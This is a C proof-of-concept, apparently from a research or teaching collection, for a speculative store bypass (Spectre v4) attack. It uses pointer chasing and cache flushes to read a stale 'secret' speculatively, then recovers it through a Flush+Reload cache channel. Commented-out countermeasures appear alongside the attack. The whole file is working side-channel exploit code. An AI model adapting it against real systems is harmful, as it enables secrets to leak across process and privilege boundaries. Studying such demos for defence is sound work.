#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <seccomp.h>
#include <linux/seccomp.h>


#include "libcache/cacheutils.h"

// inaccessible (overwritten) secret
#define SECRET      "INACCESSIBLE SECRET"
#define OVERWRITE   '#'

char* data;

char access_array(int x) {
  // store secret in data
  strcpy(data, SECRET);

  // flushing the data which is used in the condition increases
  // probability of speculation
  mfence();
  char** data_slowptr = &data;
  char*** data_slowslowptr = &data_slowptr;
  mfence();
  flush(&x);
  flush(data_slowptr);
  flush(&data_slowptr);
  flush(data_slowslowptr);
  flush(&data_slowslowptr);
  // ensure data is flushed at this point
  mfence();

  // overwrite data via different pointer
  // pointer chasing makes this extremely slow
  (*(*data_slowslowptr))[x] = OVERWRITE;

  // data[x] should now be "#"
  // uncomment next line to break attack
  //mfence();
  // Encode stale value in the cache
  cache_encode(data[x]);
}

int main(int argc, const char **argv) {
  data = malloc(128);
  // Detect cache threshold
  if(!CACHE_MISS)
    CACHE_MISS = detect_flush_reload_threshold();
  printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);
  
  pagesize = sysconf(_SC_PAGESIZE);
  // countermeasure:
  // prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_STORE_BYPASS, PR_SPEC_DISABLE, 0, 0);

// countermeasure 2:
  // prctl(PR_SET_NO_NEW_PRIVS, 1);
  // prctl(PR_SET_DUMPABLE, 0);
  // scmp_filter_ctx ctx;
  // ctx = seccomp_init(SCMP_ACT_ALLOW);
  // seccomp_load(ctx);
  //

  char *_mem = malloc(pagesize * (256 + 4));
  // page aligned
  mem = (char *)(((size_t)_mem & ~(pagesize-1)) + pagesize * 2);
  // initialize memory
  memset(mem, 0, pagesize * 256);

  // store secret
  strcpy(data, SECRET);

  // Flush our shared memory
  flush_shared_memory();

  // nothing leaked so far
  char leaked[sizeof(SECRET) + 1];
  memset(leaked, ' ', sizeof(leaked));
  leaked[sizeof(SECRET)] = 0;

  int j = 0;
  while(1) {
    // for every byte in the string
    j = (j + 1) % sizeof(SECRET);

    // overwrite value with X, then access
    access_array(j);

    mfence(); // avoid speculation
    // Recover data from covert channel
    cache_decode_pretty(leaked, j);

    if(!strncmp(leaked, SECRET, sizeof(SECRET) - 1))
      break;

    sched_yield();
  }
  printf("\n\n[\x1b[32m>\x1b[0m] Done\n");

  return 0;
}
